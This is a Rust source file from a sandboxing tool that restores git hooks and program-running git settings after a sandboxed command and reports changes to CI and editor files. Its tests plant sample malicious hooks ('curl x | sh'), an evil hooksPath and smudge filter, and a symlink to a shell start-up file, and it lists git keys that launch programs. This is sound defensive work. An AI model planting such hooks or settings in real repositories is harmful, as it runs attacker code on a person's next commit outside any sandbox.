//! What a sandboxed command changed where code runs later.
//!
//! Landlock lets a command write the whole workspace or none of it, so it
//! cannot keep it from `.git/hooks`. What it wrote there is put back as it
//! was once the command ends: a hook written by a command would run at the
//! person's next commit, outside the sandbox. Git's settings are put back
//! only when a setting that runs a program changed, since `git branch -u`
//! writes them too. The other places where code runs later (CI, the
//! editor's tasks, direnv) are told, for the person to see, and left.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use crate::paths::RUNS_LATER;

/// The largest file kept to be put back: a hook or a setting is small.
const LARGEST: u64 = 1 << 20;

/// The most files kept from one place.
const MOST: usize = 500;

/// Git's settings that name a program git runs, by section and key, `*`
/// for any subsection (`filter.lfs.smudge`).
const RUNNING: &[&str] = &[
    "core.hookspath",
    "core.fsmonitor",
    "core.sshcommand",
    "core.pager",
    "core.editor",
    "core.askpass",
    "core.gitproxy",
    "sequence.editor",
    "diff.external",
    "diff.*.textconv",
    "diff.*.command",
    "merge.*.driver",
    "filter.*.clean",
    "filter.*.smudge",
    "filter.*.process",
    "credential.helper",
    "credential.*.helper",
    "gpg.program",
    "gpg.*.program",
    "include.path",
    "includeif.*.path",
    "uploadpack.packobjectshook",
    "remote.*.uploadpack",
    "remote.*.receivepack",
    "alias.*",
];

/// The files of the places watched, as they were before a command.
#[derive(Debug)]
pub(crate) struct Watch {
    workspace: PathBuf,
    /// The repository's own folder, where git keeps its hooks and
    /// settings: the workspace's `.git`, or for a worktree the folder its
    /// `.git` file leads to.
    git: PathBuf,
    /// Hooks git runs, put back.
    hooks: BTreeMap<PathBuf, Vec<u8>>,
    /// The folders hooks are run from.
    hook_folders: Vec<PathBuf>,
    /// Git's settings.
    config: Option<Vec<u8>>,
    /// The other places, told.
    told: BTreeMap<PathBuf, Vec<u8>>,
}

/// What a command changed where code runs later.
#[derive(Debug, Default, PartialEq, Eq)]
pub(crate) struct Settled {
    /// What was put back as it was, or removed.
    pub(crate) restored: Vec<PathBuf>,
    /// What changed and was left, for the person to see.
    pub(crate) touched: Vec<PathBuf>,
}

impl Watch {
    /// Keeps what the places of `workspace` hold now.
    pub(crate) fn take(workspace: &Path) -> Self {
        let workspace = &workspace
            .canonicalize()
            .unwrap_or_else(|_| workspace.to_path_buf());
        // A worktree's `.git` is a file leading to a folder of the
        // repository's own, outside the workspace: git runs the hooks kept
        // there, and a command may write it when the gate lets it, as it
        // must to commit.
        let git = common_dir(workspace);
        let config = std::fs::read(git.join("config")).ok();
        let mut hook_folders = vec![git.join("hooks")];
        if let Some(path) = config.as_deref().and_then(hooks_path) {
            hook_folders.push(workspace.join(path));
        }
        let mut hooks = BTreeMap::new();
        for folder in &hook_folders {
            keep(folder, &mut hooks);
        }
        let mut told = BTreeMap::new();
        for place in RUNS_LATER.iter().filter(|place| **place != ".git") {
            let path = workspace.join(place);
            if !hook_folders.contains(&path) {
                keep(&path, &mut told);
            }
        }
        Self {
            workspace: workspace.to_path_buf(),
            git,
            hooks,
            hook_folders,
            config,
            told,
        }
    }

    /// Puts back the hooks and the settings that run a program as they were,
    /// and tells what else changed.
    pub(crate) fn settle(self) -> Settled {
        let mut settled = Settled::default();
        let mut hooks_now = BTreeMap::new();
        for folder in &self.hook_folders {
            keep(folder, &mut hooks_now);
        }
        for (path, now) in &hooks_now {
            let put = match self.hooks.get(path) {
                Some(before) if before == now => continue,
                Some(before) => self.put_back(path, Some(before)),
                None => self.put_back(path, None),
            };
            settled.record(path, put);
        }
        for (path, before) in &self.hooks {
            if !hooks_now.contains_key(path) {
                let put = self.put_back(path, Some(before));
                settled.record(path, put);
            }
        }
        let config = self.git.join("config");
        if let Some(before) = &self.config {
            let now = std::fs::read(&config).unwrap_or_default();
            if &now != before && running(before) != running(&now) {
                let put = self.put_back(&config, Some(before));
                settled.record(&config, put);
            }
        }
        let mut told_now = BTreeMap::new();
        for place in RUNS_LATER.iter().filter(|place| **place != ".git") {
            let path = self.workspace.join(place);
            if !self.hook_folders.contains(&path) {
                keep(&path, &mut told_now);
            }
        }
        let changed = told_now
            .iter()
            .filter(|(path, now)| self.told.get(*path) != Some(now))
            .map(|(path, _)| path.clone());
        let removed = self
            .told
            .keys()
            .filter(|path| !told_now.contains_key(*path))
            .cloned();
        settled.touched.extend(changed.chain(removed));
        settled.restored.sort();
        settled.touched.sort();
        settled
    }
}

impl Watch {
    /// Puts `bytes` back at `path`, or removes what is there when `None`.
    /// Only within the workspace or the repository's own folder as they
    /// really are: iq is not sandboxed, and a command may have made a folder
    /// on the way, or the file itself, a link to elsewhere, such as a
    /// start-up file of the shell.
    fn put_back(&self, path: &Path, bytes: Option<&Vec<u8>>) -> bool {
        let Some(parent) = path.parent() else {
            return false;
        };
        let real = parent.canonicalize().ok();
        if real.as_deref() != Some(parent)
            || !(parent.starts_with(&self.workspace) || parent.starts_with(&self.git))
        {
            return false;
        }
        // A link the command put in the file's stead goes, not its target.
        let removed = std::fs::remove_file(path);
        match bytes {
            Some(bytes) => std::fs::write(path, bytes).is_ok(),
            None => removed.is_ok(),
        }
    }
}

impl Settled {
    /// Notes that `path` was put back, else that it changed and could not
    /// be, for the person to see.
    fn record(&mut self, path: &Path, put: bool) {
        if put {
            self.restored.push(path.to_path_buf());
        } else {
            self.touched.push(path.to_path_buf());
        }
    }
}

/// Keeps the files at `path`, a file or a folder, into `out`.
fn keep(path: &Path, out: &mut BTreeMap<PathBuf, Vec<u8>>) {
    let Ok(meta) = std::fs::symlink_metadata(path) else {
        return;
    };
    if meta.is_file() || meta.file_type().is_symlink() {
        if meta.len() <= LARGEST
            && let Ok(bytes) = std::fs::read(path)
        {
            out.insert(path.to_path_buf(), bytes);
        }
        return;
    }
    let mut stack = vec![path.to_path_buf()];
    let mut kept = 0;
    while let Some(folder) = stack.pop() {
        let Ok(entries) = std::fs::read_dir(&folder) else {
            continue;
        };
        for entry in entries.flatten() {
            if kept >= MOST {
                return;
            }
            let Ok(kind) = entry.file_type() else {
                continue;
            };
            if kind.is_dir() {
                stack.push(entry.path());
            } else if entry.metadata().is_ok_and(|meta| meta.len() <= LARGEST)
                && let Ok(bytes) = std::fs::read(entry.path())
            {
                out.insert(entry.path(), bytes);
                kept += 1;
            }
        }
    }
}

/// The repository's own folder for `workspace`, resolved: its `.git`, or
/// for a worktree the folder its `.git` file names, and from there the
/// repository's, which `commondir` names and which holds the hooks and the
/// settings. Its `.git` when nothing can be read: there is no repository.
fn common_dir(workspace: &Path) -> PathBuf {
    let git = workspace.join(".git");
    if git.is_dir() {
        return git;
    }
    let Some(named) = std::fs::read_to_string(&git).ok().and_then(|text| {
        text.trim()
            .strip_prefix("gitdir:")
            .map(|p| p.trim().to_owned())
    }) else {
        return git;
    };
    let git_dir = workspace.join(named);
    let git_dir = git_dir.canonicalize().unwrap_or(git_dir);
    let common = match std::fs::read_to_string(git_dir.join("commondir")) {
        Ok(text) => git_dir.join(text.trim()),
        Err(_) => git_dir,
    };
    common.canonicalize().unwrap_or(common)
}

/// The folder git's settings run hooks from, when they say.
fn hooks_path(config: &[u8]) -> Option<String> {
    settings(config)
        .into_iter()
        .find(|(key, _)| key == "core.hookspath")
        .map(|(_, value)| value)
}

/// Git's settings that run a program, as `key = value` lines.
fn running(config: &[u8]) -> Vec<(String, String)> {
    let mut found: Vec<(String, String)> = settings(config)
        .into_iter()
        .filter(|(key, _)| RUNNING.iter().any(|pattern| matches_key(pattern, key)))
        .collect();
    found.sort();
    found
}

/// Whether `key`, `section.subsection.name`, is what `pattern` names.
fn matches_key(pattern: &str, key: &str) -> bool {
    let (section, rest) = key.split_once('.').unwrap_or((key, ""));
    let (name, subsection) = match rest.rsplit_once('.') {
        Some((subsection, name)) => (name, Some(subsection)),
        None => (rest, None),
    };
    let parts: Vec<&str> = pattern.split('.').collect();
    match (parts.as_slice(), subsection) {
        ([s, "*"], _) => *s == section,
        ([s, n], None) => *s == section && *n == name,
        ([s, "*", n], Some(_)) => *s == section && *n == name,
        _ => false,
    }
}

/// Git's settings as `section[.subsection].name` and value, the section and
/// name lowered as git compares them.
fn settings(config: &[u8]) -> Vec<(String, String)> {
    let text = String::from_utf8_lossy(config);
    let mut section = String::new();
    let mut out = Vec::new();
    for line in text.lines() {
        let line = line.trim();
        if line.starts_with('#') || line.starts_with(';') || line.is_empty() {
            continue;
        }
        if let Some(header) = line.strip_prefix('[').and_then(|l| l.split_once(']')) {
            let header = header.0.trim();
            section = match header.split_once(char::is_whitespace) {
                Some((name, sub)) => {
                    format!("{}.{}", name.to_lowercase(), sub.trim().trim_matches('"'))
                }
                None => header.to_lowercase(),
            };
            continue;
        }
        let (name, value) = line.split_once('=').unwrap_or((line, "true"));
        out.push((
            format!("{section}.{}", name.trim().to_lowercase()),
            value.trim().to_owned(),
        ));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn workspace() -> tempfile::TempDir {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join(".git/hooks")).unwrap();
        std::fs::write(
            dir.path().join(".git/hooks/pre-push"),
            "#!/bin/sh\nexit 0\n",
        )
        .unwrap();
        std::fs::write(dir.path().join(".git/config"), "[core]\n\tbare = false\n").unwrap();
        dir
    }

    #[test]
    fn hooks_are_put_back() {
        let dir = workspace();
        let root = &dir.path().canonicalize().unwrap();
        let watch = Watch::take(root);
        std::fs::write(
            root.join(".git/hooks/pre-commit"),
            "#!/bin/sh\ncurl x | sh\n",
        )
        .unwrap();
        std::fs::write(root.join(".git/hooks/pre-push"), "#!/bin/sh\ncurl x | sh\n").unwrap();
        let settled = watch.settle();
        assert_eq!(
            settled.restored,
            [
                root.join(".git/hooks/pre-commit"),
                root.join(".git/hooks/pre-push")
            ]
        );
        assert!(!root.join(".git/hooks/pre-commit").exists());
        assert_eq!(
            std::fs::read_to_string(root.join(".git/hooks/pre-push")).unwrap(),
            "#!/bin/sh\nexit 0\n"
        );
    }

    #[test]
    fn a_worktree_has_its_hooks_put_back_in_the_repository_it_belongs_to() {
        let repository = workspace();
        let common = repository.path().canonicalize().unwrap().join(".git");
        std::fs::create_dir_all(common.join("worktrees/task")).unwrap();
        std::fs::write(common.join("worktrees/task/commondir"), "../..\n").unwrap();
        let dir = tempfile::tempdir().unwrap();
        let root = &dir.path().canonicalize().unwrap();
        std::fs::write(
            root.join(".git"),
            format!("gitdir: {}\n", common.join("worktrees/task").display()),
        )
        .unwrap();
        let watch = Watch::take(root);
        std::fs::write(common.join("hooks/pre-commit"), "#!/bin/sh\ncurl x | sh\n").unwrap();
        std::fs::write(common.join("config"), "[core]\n\thooksPath = /tmp/evil\n").unwrap();
        let settled = watch.settle();
        assert_eq!(
            settled.restored,
            [common.join("config"), common.join("hooks/pre-commit")]
        );
        assert!(!common.join("hooks/pre-commit").exists());
        assert_eq!(
            std::fs::read_to_string(common.join("config")).unwrap(),
            "[core]\n\tbare = false\n"
        );
    }

    #[test]
    fn settings_are_put_back_only_when_they_run_something() {
        let dir = workspace();
        let root = &dir.path().canonicalize().unwrap();
        let config = root.join(".git/config");
        let watch = Watch::take(root);
        std::fs::write(
            &config,
            "[core]\n\tbare = false\n[branch \"main\"]\n\tremote = origin\n",
        )
        .unwrap();
        assert_eq!(watch.settle(), Settled::default());
        let watch = Watch::take(root);
        std::fs::write(&config, "[core]\n\tbare = false\n\thooksPath = /tmp/evil\n").unwrap();
        assert_eq!(watch.settle().restored, std::slice::from_ref(&config));
        assert!(!std::fs::read_to_string(&config).unwrap().contains("evil"));
        let watch = Watch::take(root);
        std::fs::write(&config, "[filter \"lfs\"]\n\tsmudge = evil %f\n").unwrap();
        assert_eq!(watch.settle().restored, [config]);
    }

    #[test]
    fn a_hooks_folder_the_settings_name_is_watched_and_others_are_told() {
        let dir = workspace();
        let root = &dir.path().canonicalize().unwrap();
        std::fs::write(
            root.join(".git/config"),
            "[core]\n\thooksPath = .githooks\n",
        )
        .unwrap();
        std::fs::create_dir_all(root.join(".githooks")).unwrap();
        std::fs::create_dir_all(root.join(".github/workflows")).unwrap();
        let watch = Watch::take(root);
        std::fs::write(root.join(".githooks/pre-commit"), "evil").unwrap();
        std::fs::write(root.join(".github/workflows/ci.yml"), "on: push").unwrap();
        let settled = watch.settle();
        assert_eq!(settled.restored, [root.join(".githooks/pre-commit")]);
        assert_eq!(settled.touched, [root.join(".github/workflows/ci.yml")]);
        assert!(root.join(".github/workflows/ci.yml").exists());
    }

    #[test]
    fn a_link_in_a_hooks_stead_is_not_followed() {
        let dir = workspace();
        let root = &dir.path().canonicalize().unwrap();
        let outside = tempfile::tempdir().unwrap();
        let target = outside.path().join("bashrc");
        std::fs::write(&target, "mine").unwrap();
        let watch = Watch::take(root);
        std::fs::remove_file(root.join(".git/hooks/pre-push")).unwrap();
        std::os::unix::fs::symlink(&target, root.join(".git/hooks/pre-push")).unwrap();
        let settled = watch.settle();
        assert_eq!(settled.restored, [root.join(".git/hooks/pre-push")]);
        assert_eq!(std::fs::read_to_string(&target).unwrap(), "mine");
        assert!(
            !std::fs::symlink_metadata(root.join(".git/hooks/pre-push"))
                .unwrap()
                .file_type()
                .is_symlink()
        );
    }

    #[test]
    fn keys_are_matched_as_git_names_them() {
        assert!(matches_key("filter.*.smudge", "filter.lfs.smudge"));
        assert!(matches_key("core.hookspath", "core.hookspath"));
        assert!(matches_key("alias.*", "alias.st"));
        assert!(!matches_key("core.hookspath", "core.bare"));
        assert!(!matches_key("diff.external", "diff.tool.external"));
    }
}
